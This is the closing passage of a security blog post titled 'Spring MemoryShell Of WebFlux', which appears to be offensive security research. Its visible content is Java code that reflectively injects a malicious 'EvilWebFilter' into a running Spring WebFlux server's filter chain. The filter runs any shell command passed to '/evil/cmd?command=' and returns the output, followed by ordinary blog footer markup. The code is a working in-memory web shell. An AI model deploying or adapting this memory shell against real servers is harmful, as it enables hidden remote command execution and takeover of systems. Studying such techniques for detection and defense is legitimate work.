&#123;</span><br><span class="line">                    <span class="type">NettyWebServer</span> <span class="variable">nettyWebServer</span> <span class="operator">=</span> (NettyWebServer) getFieldValue(thread, <span class="string">&quot;this$0&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">ReactorHttpHandlerAdapter</span> <span class="variable">handler</span> <span class="operator">=</span> (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, <span class="string">&quot;handler&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">httpHandler</span> <span class="operator">=</span> getFieldValue(handler,<span class="string">&quot;httpHandler&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">HttpWebHandlerAdapter</span> <span class="variable">httpWebHandlerAdapter</span> <span class="operator">=</span> (HttpWebHandlerAdapter) getFieldValue(httpHandler,<span class="string">&quot;delegate&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="type">ExceptionHandlingWebHandler</span> <span class="variable">exceptionHandlingWebHandler</span> <span class="operator">=</span> (ExceptionHandlingWebHandler) getFieldValue(httpWebHandlerAdapter,<span class="string">&quot;delegate&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">                    <span class="type">FilteringWebHandler</span> <span class="variable">filteringWebHandler</span> <span class="operator">=</span> (FilteringWebHandler) getFieldValue(exceptionHandlingWebHandler,<span class="string">&quot;delegate&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">                    <span class="type">DefaultWebFilterChain</span> <span class="variable">defaultWebFilterChain</span> <span class="operator">=</span> (DefaultWebFilterChain) getFieldValue(filteringWebHandler,<span class="string">&quot;chain&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">                    List&lt;WebFilter&gt; allFilters = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(defaultWebFilterChain.getFilters());</span><br><span class="line">                    allFilters.add(<span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">EvilWebFilter</span>());</span><br><span class="line">                    <span class="type">DefaultWebFilterChain</span> <span class="variable">newChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultWebFilterChain</span>((WebHandler) handler, allFilters);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> filteringWebHandler.getClass().getDeclaredField(<span class="string">&quot;chain&quot;</span>);</span><br><span class="line">                    f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">modifersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">                    modifersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    modifersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">                    f.set(filteringWebHandler, newChain);</span><br><span class="line">                    modifersField.setInt(f, f.getModifiers() &amp; Modifier.FINAL);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getFieldValue</span><span class="params">(Object obj, String fieldName, <span class="type">boolean</span> superClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field f;</span><br><span class="line">        <span class="keyword">if</span>(superClass)&#123;</span><br><span class="line">            f = obj.getClass().getSuperclass().getDeclaredField(fieldName);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            f = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Flux&lt;DataBuffer&gt; <span class="title function_">getPost</span><span class="params">(ServerWebExchange exchange)</span> &#123;</span><br><span class="line">        <span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getURI().getPath();</span><br><span class="line">        <span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> request.getURI().getQuery();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (path.equals(<span class="string">&quot;/evil/cmd&quot;</span>) &amp;&amp; query != <span class="literal">null</span> &amp;&amp; query.startsWith(<span class="string">&quot;command=&quot;</span>)) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> query.substring(<span class="number">8</span>);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;;</span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds);</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">                    Flux&lt;DataBuffer&gt; response = Flux.create(sink -&gt; &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            String line;</span><br><span class="line">                            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                                sink.next(DefaultDataBufferFactory.sharedInstance.wrap(line.getBytes(StandardCharsets.UTF_8)));</span><br><span class="line">                            &#125;</span><br><span class="line">                            sink.complete();</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">                    &#125;);</span><br><span class="line"></span><br><span class="line">                    exchange.getResponse().getHeaders().setContentType(MediaType.TEXT_PLAIN);</span><br><span class="line">                    <span class="keyword">return</span> response;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> Flux.empty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/05/19/Spring-WebFlux/1713518745557-17285471-7f80-4963-b5f3-2bd1b7cdeb0c.png" alt="image.png"></p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">过程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">应用</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&text=Spring MemoryShell Of WebFlux"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&title=Spring MemoryShell Of WebFlux"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&is_video=false&description=Spring MemoryShell Of WebFlux"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Spring MemoryShell Of WebFlux&body=Check out this article: https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&title=Spring MemoryShell Of WebFlux"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&title=Spring MemoryShell Of WebFlux"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&title=Spring MemoryShell Of WebFlux"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&title=Spring MemoryShell Of WebFlux"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&name=Spring MemoryShell Of WebFlux&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://h3rmesk1t.github.io/2024/05/19/Spring-WebFlux/&t=Spring MemoryShell Of WebFlux"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+      <div class="footer-left">
+        Copyright &copy;
+        
+        
+        2023-2025
+        H3rmesk1t
+      </div>
+      <div class="footer-right">
+        <nav>
+          <ul>
+            <!--
+          --><li><a href="/">Home</a></li><!--
+        --><!--
+          --><li><a href="/archives/">Writing</a></li><!--
+        --><!--
+          --><li><a href="/tags/">Tag</a></li><!--
+        --><!--
+          --><li><a href="/search/">Search</a></li><!--
+        --><!--
+          --><li><a href="/about/">About</a></li><!--
+        -->
+          </ul>
+          <ul>
+            
+              <!-- 不蒜子统计 -->
+              <span id="busuanzi_container_site_pv">
+                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+              </span>
+              <span class="post-meta-divider">|</span>
+              <span id="busuanzi_container_site_uv" style='display:none'>
+                      本站访客数<span id="busuanzi_value_site_uv"></span>人
+              </span>
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            
+          </ul>
+        </nav>
+      </div>
+      
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'H3rmesk1t/h3rmesk1t.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = '💬';
+      var utterances_theme = 'github-light';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
